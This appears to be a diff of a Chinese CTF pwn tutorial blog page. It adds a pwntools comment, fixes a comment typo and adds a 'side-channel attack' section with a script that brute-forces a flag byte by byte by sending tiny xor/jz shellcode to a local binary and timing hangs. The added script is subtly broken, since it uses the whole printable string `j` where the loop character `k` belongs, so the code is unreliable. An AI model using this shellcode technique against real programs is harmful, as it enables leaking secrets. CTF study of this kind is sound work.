@@ -311,7 +311,7 @@
 
 
                 <time class="article-time--reading">
-                    阅读时长: 77 分钟
+                    阅读时长: 78 分钟
                 </time>
                 <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
   <path stroke="none" d="M0 0h24v24H0z"/>
@@ -322,7 +322,7 @@
 
 
                 <time class="article-words">
-                    38451 字
+                    38592 字
                 </time>
             </div>
         
@@ -925,11 +925,13 @@
 </span><span class="lnt">35
 </span><span class="lnt">36
 </span><span class="lnt">37
+</span><span class="lnt">38
 </span></code></pre></td>
 <td class="lntd">
 <pre tabindex="0" class="chroma"><code class="language-Python" data-lang="Python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span><span class="p">,</span> <span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;i386&#39;</span><span class="p">,</span> <span class="n">os</span> <span class="o">=</span> <span class="s1">&#39;linux&#39;</span><span class="p">,</span> <span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;tmux&#39;</span><span class="p">,</span> <span class="s1">&#39;sp&#39;</span><span class="p">,</span> <span class="s1">&#39;-h&#39;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># log_level=&#39;fatal&#39; 完全不输出</span>
 </span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;tmux&#39;</span><span class="p">,</span> <span class="s1">&#39;split-w&#39;</span><span class="p">,</span> <span class="s1">&#39;-h&#39;</span><span class="p">]</span>	
 </span></span><span class="line"><span class="cl"><span class="c1">#需要保证tmux已经运行</span>
 </span></span><span class="line"><span class="cl">
@@ -3177,7 +3179,7 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span> <span class="n">buf</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">&lt;=</span> <span class="mi">31</span> <span class="o">||</span> <span class="n">buf</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="mi">127</span> <span class="p">)</span> <span class="c1">// 进允许输入可见字符的Shellcode
+<pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span> <span class="n">buf</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">&lt;=</span> <span class="mi">31</span> <span class="o">||</span> <span class="n">buf</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="mi">127</span> <span class="p">)</span> <span class="c1">// 仅允许输入可见字符的Shellcode
 </span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>使用工具<strong>AE64</strong></p>
@@ -3207,6 +3209,60 @@
 </span></span><span class="line"><span class="cl"><span class="c1"># arg: shellcode, 寄存器: call rdx, 偏移, 策略:fast or small</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">ss</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>侧信道攻击</strong></p>
+<ul>
+<li>传入极少字节shellcode，已知rdi寄存器存放泄露内容flag</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">flag</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl"><span class="n">j</span> <span class="o">=</span> <span class="n">string</span><span class="o">.</span><span class="n">printable</span>
+</span></span><span class="line"><span class="cl"><span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">k</span> <span class="ow">in</span> <span class="n">j</span><span class="p">:</span> 
+</span></span><span class="line"><span class="cl">        <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&#34;./elf&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">payload</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;&#34;&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s2">                xor byte ptr [rdi+</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s2">], </span><span class="si">{</span><span class="n">j</span><span class="si">}</span><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">                jz $
+</span></span></span><span class="line"><span class="cl"><span class="s2">            &#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">            <span class="n">shellcode</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span> <span class="c1"># 6字节</span>
+</span></span><span class="line"><span class="cl">            <span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="n">timeout</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span> <span class="c1"># 若猜测正确程序卡死</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;idx: </span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s2">, try: </span><span class="si">{</span><span class="n">j</span><span class="si">}</span><span class="s2">--yes&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">flag</span><span class="o">+=</span><span class="nb">str</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="n">j</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">io</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">            <span class="k">break</span>
+</span></span><span class="line"><span class="cl">        <span class="k">except</span> <span class="ne">EOFError</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">io</span><span class="o">.</span><span class="n">close</span><span class="p">()</span> <span class="c1"># 猜测错误则EOF跳出</span>
+</span></span><span class="line"><span class="cl">            <span class="k">continue</span>
 </span></span></code></pre></td></tr></table>
 </div>
 </div><h2 id="rop">ROP</h2>
@@ -6840,7 +6896,7 @@
         
             
         
-        共 101.95k 字 · 共 16篇文章
+        共 102.83k 字 · 共 16篇文章
         <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
 
         <br />本站访客数<span id="busuanzi_value_site_uv"></span>人次---
